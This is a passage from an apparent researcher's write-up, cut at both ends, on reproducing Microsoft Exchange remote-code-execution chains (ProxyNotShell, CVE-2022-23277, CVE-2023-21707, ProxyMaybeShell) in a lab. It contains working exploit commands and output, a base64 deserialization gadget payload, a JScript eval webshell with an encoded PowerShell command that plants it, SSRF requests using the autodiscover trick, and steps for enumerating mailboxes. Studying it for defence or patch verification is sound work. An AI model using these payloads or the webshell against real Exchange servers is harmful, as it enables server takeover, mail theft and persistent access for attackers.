        <wsman:Locale s:mustUnderstand="false" xml:lang="en-US" />
        <wsman:MaxEnvelopeSize s:mustUnderstand="true">512000</wsman:MaxEnvelopeSize>
        <wsa:MessageID>uuid:cf698888-a7a6-4c25-b5d3-72b30a0e1bfd</wsa:MessageID>
        <wsman:OperationTimeout>PT20S</wsman:OperationTimeout>
        <wsa:ReplyTo>
            <wsa:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
        </wsa:ReplyTo>
        <wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>
        <wsmv:SessionId s:mustUnderstand="false">uuid:c3e774b7-9f83-485c-aeed-7b58740c958b</wsmv:SessionId>
        <wsa:To>http://ex01.lab.local/</wsa:To>
        <wsman:SelectorSet>
            <wsman:Selector Name="ShellId">8FCEBA08-6309-4EA7-B742-738E3803F596</wsman:Selector>
        </wsman:SelectorSet>
    </s:Header>
    <s:Body />
</s:Envelope>
```

- response

``` bash
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/soap+xml;charset=UTF-8
Content-Encoding: gzip
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
request-id: 1d876b8a-ede2-4066-a9d6-b5d98c826528
X-CalculatedBETarget: win-upf09r7h264.exchange2016.com
X-AspNet-Version: 4.0.30319
Set-Cookie: X-BackEndCookie=; expires=Wed, 08-Sep-1993 12:12:48 GMT; path=/autodiscover; secure; HttpOnly
X-Powered-By: ASP.NET
X-FEServer: WIN-UPF09R7H264
Date: Fri, 08 Sep 2023 12:12:47 GMT
Content-Length: 452

<s:Envelope xml:lang="zh-CN" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/DeleteResponse</a:Action><a:MessageID>uuid:FE680659-286C-4D5C-811B-2EB05B0A3D34</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:cf698888-a7a6-4c25-b5d3-72b30a0e1bfd</a:RelatesTo></s:Header><s:Body></s:Body></s:Envelope>
```

- exchange versions successfully tested locally:

| Test status | exchange version | File Name | Publication date | File Size |
| ----------- | ----------- | ----------- | ----------- | ----------- |
| python poc succeeded but msf failed | Exchange Server 2016 Cumulative Update CU17(KB4556414) 15.01.2044.004 | ExchangeServer2016-x64-cu17.iso | 2020/6/12 | 6.6 GB |
| Test failed | Exchange Server 2019 Cumulative Update 12 (KB5011156) 15.02.1118.007 | ExchangeServer2019-x64-CU12.ISO | 2022/4/20 | 5.8 GB |
| Test failed | Exchange Server 2016 Cumulative Update 22 (KB5005333) 15.01.2375.007 | ExchangeServer2016-x64-CU22.ISO | 2021/9/24 | 6.6 GB |
| Test failed | Exchange Server 2013 Cumulative Update 23 (KB4489622) 15.00.1497.002 | Exchange2013-x64-cu23.exe | 2021/5/3 | 1.6 GB |

The poc script will need further modification to fit each exchange version

## Local testing of the ProxyNotShell PoC published by Janggggg

- [The ProxyNotShell PoC published on Janggggg's github](https://github.com/testanull/ProxyNotShell-PoC)

- [twitter screenshots proving the poc exploitation](https://twitter.com/wdormann/status/1593311129874403335?s=20&t=VlkAC7azYSOHl9MF4bOc3g)

1. Using the poc script to start notepad.exe

``` bash
root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxynotshell.py https://192.168.14.6 'username' 'password' notepad.exe
[+] Create powershell session
[+] Got ShellId success
[+] Run keeping alive request
[+] Success keeping alive
[+] Run cmdlet new-offlineaddressbook
[+] Create powershell pipeline
[+] Run keeping alive request
[+] Success remove session
```

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxynotshell.png)

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxynotshell1.png)

2. Using the poc script to write a txt file

``` bash
root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxynotshell.py https://192.168.14.6 'username' 'password' "echo 'proxynotshell is here' > C:\proxynotshell.txt"
[+] Create powershell session
[+] Got ShellId success
[+] Run keeping alive request
[+] Success keeping alive
[+] Run cmdlet new-offlineaddressbook
[+] Create powershell pipeline
[+] Run keeping alive request
[+] Success remove session
```

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxynotshell2.png)

3. Using the poc script to start cmd.exe

``` bash
root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxynotshell.py https://192.168.14.6 'username' 'password' cmd.exe
[+] Create powershell session
[+] Got ShellId success
[+] Run keeping alive request
[+] Success keeping alive
[+] Run cmdlet new-offlineaddressbook
[+] Create powershell pipeline
[+] Run keeping alive request
[+] Success remove session
```

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxynotshell3.png)

## Local testing of the Metasploit ProxyNotShell RCE exp

On November 17, [ZeroSteiner](https://github.com/zeroSteiner) shared a [pull request](https://github.com/rapid7/metasploit-framework/pull/17275) with MetaSploit which provides a common way to exploit the vulnerability and also provides a way to bypass the [Exchange Emergency Mitigation (EM) service](https://learn.microsoft.com/en-us/exchange/exchange-emergency-mitigation-service?view=exchserver-2019), or the IIS URL rewrite that Microsoft recommends. The PR also contains updates for the ProxyShell vulnerability.

- [metasploit Microsoft Exchange ProxyNotShell RCE](https://www.rapid7.com/db/modules/exploit/windows/http/exchange_proxynotshell_rce/)

Officially it only supports Exchange Server 2019 (version 15.2); an unpatched exchange older than CU12 could be tried, but there is no such environment locally at the moment

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxynotshell4.png)
 - [exchange_proxynotshell_rce.rb](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxynotshell/exchange_proxynotshell_rce.rb)

The metasploit proxynotshell rb script will need further modification to fit each exchange version

# ProxyNotRelay
## ProxyNotRelay part links

- [ProxyNotRelay - An Exchange Vulnerability](https://rw.md/2022/11/09/ProxyNotRelay.html)

# CVE-2022-21969
## CVE-2022-21969 part links

 - [Searching for Deserialization Protection Bypasses in Microsoft Exchange (CVE-2022–21969)](https://medium.com/@frycos/searching-for-deserialization-protection-bypasses-in-microsoft-exchange-cve-2022-21969-bfa38f63a62d)

# OWASSRF + TabShell
## OWASSRF + TabShell part links

 - [The OWASSRF + TabShell exploit chain](https://blog.viettelcybersecurity.com/tabshell-owassrf/)

# CVE-2022-23277 (completed)
## CVE-2022-23277 part links

- [DotNet security - reproducing the CVE-2022-23277 vulnerability](https://mp.weixin.qq.com/s/lrlZiVH3QZI3rMRZwk_l6A)
 - [The scripts involved in "DotNet security - reproducing the CVE-2022-23277 vulnerability"](https://github.com/7BitsTeam/CVE-2022-23277)
 - [Bypassing .NET Serialization Binders](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)
 - [dotnet deserialization and the not-so-safe SerializationBinder](https://y4er.com/posts/dotnet-deserialize-bypass-binder/)
 - [Meeting Exchange again in 2022: deserialization vulnerability analysis (part two)](https://zhuanlan.zhihu.com/p/531190946)
 - [Deep understand ASPX file handling and some related attack vectors](https://blog.viettelcybersecurity.com/deep-understand-aspx-file-handling-and-some-related-attack-vector/)
 - [The journey of exploiting a Sharepoint vulnerability.](https://blog.viettelcybersecurity.com/the-journey-of-exploiting-a-sharepoint-vulnerability/)
 - [Microsoft Exchange Server ChainedSerializationBinder Remote Code Execution](https://packetstormsecurity.com/files/168131/Microsoft-Exchange-Server-ChainedSerializationBinder-Remote-Code-Execution.html)
 - [Microsoft Exchange Server: Remote Code Execution vulnerability CVE-2022-23277 exploitable despite patch?](https://borncity.com/win/2022/06/30/microsoft-exchange-server-remote-code-execution-schwachstelle-cve-2022-23277-trotz-patch-ausnutzbar/)
 - [Class: BinaryFormatter](https://referencesource.microsoft.com/#mscorlib/system/runtime/serialization/formatters/binary/binaryformatter.cs)
 - [cve-2022-23277 PoC video](https://www.youtube.com/watch?v=b00oDvuDYU0)
 - [A quick note on the BinaryFormatter binder and CVE-2022–23277](https://testbnull.medium.com/note-nhanh-v%E1%BB%81-binaryformatter-binder-v%C3%A0-cve-2022-23277-6510d469604c)

.NET deserialization problems rose in 2017

 - [the remark "SerializationBinder can also be used for security" was added to the SerializationBinder documentation.](https://github.com/dotnet/dotnet-api-docs/blame/ca7d94d93ac693ef3a5d234cbceaf445cdc9ed35/xml/System.Runtime.Serialization/SerializationBinder.xml#L31)

- [In 2020 Microsoft changed its description of SerializationBinder to the exact opposite of what it said before](https://github.com/dotnet/dotnet-api-docs/commit/7fa27b6f9504e24e071b7c0ea62710f9578f751f#diff-0b8845a039c9e5f799538d0a686cb70f597a79fb3b91069fcdc76a29b537a0a8)

- The vulnerability only affects the few specific security update versions below:

``` bash
Exchange Server 2016 CU22 <= Jan22SU 15.1.2375.18 15.01.2375.018
Exchange Server 2016 CU21 <= Jan22SU 15.1.2308.21 15.01.2308.021
Exchange Server 2019 CU11 <= Jan22SU 15.2.986.15 15.02.0986.015
Exchange Server 2019 CU10 <= Jan22SU 15.2.922.20 15.02.0922.020
Exchange Server 2013 CU23 <= Jan22SU 15.0.1497.28 15.00.1497.028
```

- Local test exchange environment (Exchange Server 2016 with the 15.01.2375.018 security update installed):

| Test status | exchange version | File Name | Publication date | File Size |
| ----------- | ----------- | ----------- | ----------- | ----------- |
| Test succeeded | Exchange Server 2016 Cumulative Update 22 (KB5005333) 15.01.2375.007 | ExchangeServer2016-x64-CU22.ISO | 2021/9/24 | 6.6 GB |
| Test succeeded | Security Update For Exchange Server 2016 CU22 (KB5008631) 15.01.2375.018 | Exchange2016-KB5008631-x64-zh-hans.msp | 2022/1/11 | 151.2 MB |

The request flow of the exp for this vulnerability is the same as for the earlier CVE-2021-42321 vulnerability, it just uses the new DataSetTypeSpoof .net deserialization chain. CVE-2022-23277 is a complete bypass of the ChainedSerializationBinder.GlobalDisallowedTypesForDeserialization blocklist: when the binder returns a null value, the binder's type check on deserialization has no effect, and this vulnerability can be used to deserialize any malicious class.

CVE-2021-42321 only affects 2016 CU21/22 and 2019 CU10/11. Since CVE-2022-23277 affects every Exchange version released after ChainedSerializationBinder() was introduced, if more deserialization trigger points could be found it might affect even more Exchange versions historically.

Exchange versions that are too old, or that never introduced ChainedSerializationBinder(), cannot be exploited with this vulnerability

1. Using the original unmodified DataSetTypeSpoofGenerator.cs of ysoserial.net to write the test.txt file

``` bash
PS D:\1.recent-research\exchange\proxy-attackchain\ysoserial.net-modified\ysoserial\bin\Release> .\ysoserial.exe -g DataSetTypeSpoof -f BinaryFormatter -o base64 -c "echo fdvoid0 > C:\inetpub\wwwroot\aspnet_client\test.txt"
AAEAAAD/////AQAAAAAAAAAMAgAAAAhtc2NvcmxpYgwDAAAATlN5c3RlbS5EYXRhLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQUBAAAAY1N5c3RlbS5EYXRhLkRhdGFTZXQsIFN5c3RlbS5EYXRhLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoAAAAWRGF0YVNldC5SZW1vdGluZ0Zvcm1hdBNEYXRhU2V0LkRhdGFTZXROYW1lEURhdGFTZXQuTmFtZXNwYWNlDkRhdGFTZXQuUHJlZml4FURhdGFTZXQuQ2FzZVNlbnNpdGl2ZRJEYXRhU2V0LkxvY2FsZUxDSUQaRGF0YVNldC5FbmZvcmNlQ29uc3RyYWludHMaRGF0YVNldC5FeHRlbmRlZFByb3BlcnRpZXMURGF0YVNldC5UYWJsZXMuQ291bnQQRGF0YVNldC5UYWJsZXNfMAQBAQEAAAACAAcfU3lzdGVtLkRhdGEuU2VyaWFsaXphdGlvbkZvcm1hdAMAAAABCAEIAgIAAAAF/P///x9TeXN0ZW0uRGF0YS5TZXJpYWxpemF0aW9uRm9ybWF0AQAAAAd2YWx1ZV9fAAgDAAAAAQAAAAYFAAAAAAkFAAAACQUAAAAACQQAAAAKAQAAAAkGAAAADwYAAADIAwAAAgABAAAA/////wEAAAAAAAAADAIAAABeTWljcm9zb2Z0LlBvd2VyU2hlbGwuRWRpdG9yLCBWZXJzaW9uPTMuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUBAAAAQk1pY3Jvc29mdC5WaXN1YWxTdHVkaW8uVGV4dC5Gb3JtYXR0aW5nLlRleHRGb3JtYXR0aW5nUnVuUHJvcGVydGllcwEAAAAPRm9yZWdyb3VuZEJydXNoAQIAAAAGAwAAAOoFPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTE2Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBlY2hvIGZkdm9pZDAgJmd0OyBDOlxpbmV0cHViXHd3d3Jvb3RcYXNwbmV0X2NsaWVudFx0ZXN0LnR4dCIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8+DQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQo8L09iamVjdERhdGFQcm92aWRlcj4LCw==
```

2. Using the modified DataSetTypeSpoofGenerator.cs of ysoserial.net to write the shell file

- webshell shell.txt:

``` bash
fd<script language="JScript" runat="server" Page aspcompat=true>function Page_Load(){eval(Request["cmd"],"unsafe");}</script>
```

Encode it with powershell:

``` bash
PS D:\1.recent-research\exchange\proxy-attackchain\CVE-2022-23277-main> $file=Get-Content -Path shell.txt
PS D:\1.recent-research\exchange\proxy-attackchain\CVE-2022-23277-main> $MyScript = "Set-Content -Path 'C:\inetpub\wwwroot\aspnet_client\0.aspx' -Value '$file'"
PS D:\1.recent-research\exchange\proxy-attackchain\CVE-2022-23277-main> $MyEncodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MyScript))
PS D:\1.recent-research\exchange\proxy-attackchain\CVE-2022-23277-main> $MyEncodedScript
UwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJwBDADoAXABpAG4AZQB0AHAAdQBiAFwAdwB3AHcAcgBvAG8AdABcAGEAcwBwAG4AZQB0AF8AYwBsAGkAZQBuAHQAXAAwAC4AYQBzAHAAeAAnACAALQBWAGEAbAB1AGUAIAAnAGYAZAA8AHMAYwByAGkAcAB0ACAAbABhAG4AZwB1AGEAZwBlAD0AIgBKAFMAYwByAGkAcAB0ACIAIAByAHUAbgBhAHQAPQAiAHMAZQByAHYAZQByACIAIABQAGEAZwBlACAAYQBzAHAAYwBvAG0AcABhAHQAPQB0AHIAdQBlAD4AZgB1AG4AYwB0AGkAbwBuACAAUABhAGcAZQBfAEwAbwBhAGQAKAApAHsAZQB2AGEAbAAoAFIAZQBxAHUAZQBzAHQAWwAiAGMAbQBkACIAXQAsACIAdQBuAHMAYQBmAGUAIgApADsAfQA8AC8AcwBjAHIAaQBwAHQAPgAnAA==
```

Then put the encoded data into [DataSetTypeSpoofGenerator.cs](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/CVE-2022-23277-main/ObjectDataProviderGenerator.cs)

``` bash
// psi.FileName = inputArgs.CmdFileName;
if (inputArgs.HasArguments)
{
    // psi.Arguments = inputArgs.CmdArguments;
}

psi.FileName = "powershell.exe";
psi.Arguments = " -EncodedCommand UwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJwBDADoAXABpAG4AZQB0AHAAdQBiAFwAdwB3AHcAcgBvAG8AdABcAGEAcwBwAG4AZQB0AF8AYwBsAGkAZQBuAHQAXAAwAC4AYQBzAHAAeAAnACAALQBWAGEAbAB1AGUAIAAnAGYAZAA8AHMAYwByAGkAcAB0ACAAbABhAG4AZwB1AGEAZwBlAD0AIgBKAFMAYwByAGkAcAB0ACIAIAByAHUAbgBhAHQAPQAiAHMAZQByAHYAZQByACIAIABQAGEAZwBlACAAYQBzAHAAYwBvAG0AcABhAHQAPQB0AHIAdQBlAD4AZgB1AG4AYwB0AGkAbwBuACAAUABhAGcAZQBfAEwAbwBhAGQAKAApAHsAZQB2AGEAbAAoAFIAZQBxAHUAZQBzAHQAWwAiAGMAbQBkACIAXQAsACIAdQBuAHMAYQBmAGUAIgApADsAfQA8AC8AcwBjAHIAaQBwAHQAPgAnAA==";
```

Change the contents of the original DataSetTypeSpoofGenerator.cs to the following:

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/CVE-2022-23277-2.png)

Finally recompile ysoserial.net to get a usable gadget chain and put it into the python exp script

Using the script, everything is written successfully in one go, although the last step reports a connection error every time...

- [cve-2022-23277-exp.py](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/CVE-2022-23277-main/cve-2022-23277-exp.py)

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/CVE-2022-23277.png)

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/CVE-2022-23277-1.png)

3. Using metasploit's [Microsoft Exchange Server ChainedSerializationBinder RCE module](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/CVE-2022-23277-main/exchange_chainedserializationbinder_rce.rb)

Detection succeeds, but the file cannot be executed and no session comes back?

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/CVE-2022-23277-0.png)

# CVE-2023-21707 (deserialization remote code execution) (no domain environment available)
## CVE-2023-21707 part links

- [Microsoft Exchange Powershell Remoting Deserialization leading to RCE (CVE-2023-21707) English version](https://starlabs.sg/blog/2023/04-microsoft-exchange-powershell-remoting-deserialization-leading-to-rce-cve-2023-21707/)
 - [Microsoft Exchange Powershell Remoting Deserialization lead to RCE (CVE-2023–21707) Vietnamese original](https://testbnull.medium.com/microsoft-exchange-powershell-remoting-deserialization-lead-to-rce-cve-2023-21707-4d0e6d282f02)
 - [CVE-2023-21707 Exchange deserialization payload generation](https://github.com/N1k0la-T/CVE-2023-21707/)

- Information about the exchange versions affected by the vulnerability

``` bash
 < Exchange Server 2019 CU12 Feb23SU	February 14, 2023	15.2.1118.25	15.02.1118.025
 < Exchange Server 2019 CU11 Feb23SU	February 14, 2023	15.2.986.41	15.02.0986.041
 < Exchange Server 2016 CU23 Feb23SU	February 14, 2023	15.1.2507.21	15.01.2507.021
 < Exchange Server 2013 CU23 Feb23SU	February 14, 2023	15.0.1497.47	15.00.1497.047
```

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/CVE-2023-21707.png)

- [Research on Proxynotshell deserialization and the CVE-2023-21707 vulnerability](https://xz.aliyun.com/t/12634?accounttraceid=97643b6cad1f48a9bc8b9b3016267889gmyp)
 - [Microsoft Exchange Remote Powershell RCE (CVE-2023-21707)](https://www.youtube.com/watch?v=zB-VMAnF82c)

This vulnerability is a variant of proxynotshell

Microsoft.Exchange.Security.Authentication.GenericSidIdentity is a subclass of ClaimsIdentity. During deserialization the ClaimsIdentity object is reconstructed first, then ClaimsIdentity.OnDeserializedMethod() is called

This gives an opportunity for exploitation: the second deserialization stage can be abused to trigger RCE

- 1. This exp has to be used in an intranet environment where a domain exists
 - 2. Ports 80 (http) and 88 (Kerberos) of the target exchange must be reachable
 - 3. The account and password of the target machine have to be known

Use ysoserial.net to generate a BinaryFormatter deserialization payload for ClaimsIdentity, then put the b64-encoded payload data into ClaimsIdentity's m_serializedClaims through reflection, that is into the m_serializedClaims of Microsoft.Exchange.Security.Authentication.GenericSidIdentity. Then serialize this class with BinaryFormatter and write the serialization result into the exception's SerializationData, which gives a usable payload

# proxymaybeshell (proxyshell ssrf + proxynotshell forged X-Rps-CAT token) (completed)
## proxymaybeshell part links

- [A record of a twisty exchange exploitation - ProxyMaybeShell](https://mp.weixin.qq.com/s/mvc-HS1nB2rWzWHLBkYz2A)
 - [7BitsTeam - ProxyMaybeShell](https://github.com/7BitsTeam/ProxyMaybeShell)

- Note: the proxymaybeshell vulnerability combines proxyshell's ssrf vulnerability with proxynotshell's poc, changing the NTLM authentication that the poc uses when requesting the powershell endpoint into the forged administrator X-Rps-CAT token authentication used in the earlier proxyshell vulnerability, and changing the original proxynotshell command execution poc into a file write exp that writes a shell. It suits the extreme case where the account and password of the target exchange server are unknown, and it suits real engagements

- The information about the exchange versions affected by the vulnerability is the same as for proxyshell and proxynotshell

## Reproducing and exploiting the vulnerability

0. First, using the proxyshell one-click shell writing exp directly, the write turns out to fail

``` bash
(base) D:\1.recent-research\exchange\proxy-attackchain\proxyshell>python proxyshell-auto.py -t 10.0.102.210
fqdn exchange2016.exchange.lab
+ beizhuan@exchange.lab
legacyDN /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=d0e52d16ed3b48c1902e2a527e8aad4f-beizh
leak_sid S-1-5-21-3005828558-642831567-1133831210-1152
token VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBViZWl6aHVhbkBleGNoYW5nZS5sYWJVLVMtMS01LTIxLTMwMDU4Mjg1NTgtNjQyODMxNTY3LTExMzM4MzEyMTAtMTE1MkcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA==
set_ews Success with subject kniyztfvzqlbosvg
write webshell at aspnet_client/xscmc.aspx
OUTPUT:

ERROR:
The term 'New-ManagementRoleAssignment' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
OUTPUT:

ERROR:
The term 'Get-MailboxExportRequest' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
OUTPUT:

ERROR:
The term 'New-MailboxExportRequest' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
<Response [404]>
<Response [404]>
<Response [404]>
<Response [404]>
<Response [404]>
write webshell at owa/auth/qnieo.aspx
OUTPUT:

ERROR:
The term 'New-ManagementRoleAssignment' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
```

Looking at the response, there is no mail export related command, which suggests the account does not have enough privileges:

1. Using a free public online environment

- [xBitsPlatform usage instructions](https://mp.weixin.qq.com/s?__biz=MzkwNjMyNzM1Nw==&mid=2247500069&idx=1&sn=5e06c7b98f9a90cc016e9125b3458e6b&chksm=c0e8a577f79f2c6125ee8971cd2751e831bb7270e096e706a074cf559363d98c902ab3f59c9e&scene=21#wechat_redirect)

Just visit https://10.0.102.210

2. Start with proxyshell first

Probing shows that the target only exposes interfaces such as autodiscover/ews/powershell/mapi, with no graphical interfaces such as owa/ecp.

Visit the autodiscover/ews/powershell/mapi interfaces, type any account and password, then capture and replay the packet, which gives

``` bash
HTTP/1.1 401 Unauthorized
Server: Microsoft-IIS/10.0
request-id: 6e1ad4de-710c-4725-b955-83a56aa74638
WWW-Authenticate: NTLM TlRMTVNTUAACAAAAEAAQADgAAAAFgomiaqEWKNoKTbAAAAAAAAAAAK4ArgBIAAAACgB8TwAAAA9FAFgAQwBIAEEATgBHAEUAAgAQAEUAWABDAEgAQQBOAEcARQABABgARQBYAEMASABBAE4ARwBFADIAMAAxADYABAAYAGUAeABjAGgAYQBuAGcAZQAuAGwAYQBiAAMAMgBlAHgAYwBoAGEAbgBnAGUAMgAwADEANgAuAGUAeABjAGgAYQBuAGcAZQAuAGwAYQBiAAUAGABlAHgAYwBoAGEAbgBnAGUALgBsAGEAYgAHAAgAAhw2dN7p2QEAAAAA
WWW-Authenticate: Negotiate
X-Powered-By: ASP.NET
X-FEServer: EXCHANGE2016
WWW-Authenticate: Basic realm="10.0.102.210"
Date: Mon, 18 Sep 2023 03:16:02 GMT
Connection: close
Content-Length: 0
```

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxymaybeshell.png)

Get information such as the intranet domain name from the ntlm authentication information of the autodiscover interface:

``` bash
exchange.lab
```

3. Getting the dn of the built-in users

A domain with exchange installed contains several built-in accounts, and you can try to get their dn:

``` bash
Administrator
SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}
FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
Migration.8f3e7716-2011-43e4-96b1-aba62d229136
SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}
```

But in this environment every brute force attempt failed

- [proxyshell-enumerate.py](https://github.com/dmaasland/proxyshell-poc/blob/main/proxyshell-enumerate.py), using a feature of the ews interface to get the mailbox list; by default a list is returned:

- request

``` bash
POST /autodiscover/autodiscover.json?@evil.corp/EWS/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp HTTP/1.1
Host: 10.0.102.210
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: text/xml
Content-Length: 569

<soap:Envelope
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016" />
  </soap:Header>
 <soap:Body>
    <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
      <m:UnresolvedEntry>SMTP:</m:UnresolvedEntry>
    </m:ResolveNames>
  </soap:Body>
</soap:Envelope>
```

- response

``` bash
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/xml; charset=utf-8
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
request-id: 8d123af2-3b41-4926-b948-6915c5ed3c7d
X-CalculatedBETarget: exchange2016.exchange.lab
X-DiagInfo: EXCHANGE2016
X-BEServer: EXCHANGE2016
X-AspNet-Version: 4.0.30319
Set-Cookie: exchangecookie=52c52ff0f51147d6aa9721222a58b5b6; expires=Wed, 18-Sep-2024 08:13:16 GMT; path=/; HttpOnly
Set-Cookie: X-BackEndCookie=; expires=Sat, 18-Sep-1993 08:13:16 GMT; path=/autodiscover; secure; HttpOnly
X-Powered-By: ASP.NET
X-FEServer: EXCHANGE2016
Date: Mon, 18 Sep 2023 08:13:16 GMT
Connection: close
Content-Length: 4531

